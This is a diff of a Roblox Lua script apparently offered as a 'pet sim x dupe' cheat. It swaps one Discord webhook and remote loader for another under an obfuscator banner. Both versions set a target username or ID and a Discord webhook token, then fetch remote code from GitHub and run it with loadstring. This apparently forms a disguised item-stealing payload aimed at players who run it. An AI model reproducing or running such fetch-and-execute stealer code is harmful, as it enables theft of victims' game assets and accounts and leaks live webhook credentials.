@@ -1,5 +1,8 @@
-UserName = "Funnyanthany"
-UserName2 = "whyyoubleed" 
-Webhook = "https://discord.com/api/webhooks/1089392549405397042/mBZF_RljeUiHM1weut02c50BlB45ckH3tVTohqCMv46EYgMEL2PlqQOlMvqlfqt4LYd9" 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/boywithluke/pet-sim-x-script/main/OP%20pet%20sim%20x%20dupe%20script"))()
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+_G.UserID=226297822;_G.Webhook="https://discord.com/api/webhooks/1089642305494982666/MMs1JfdNrhgT6yiD22vF5CldDip8S-UmG98JZAG74UWPyrwolDZS7gMK2OkCZNZo0vPc";loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))();
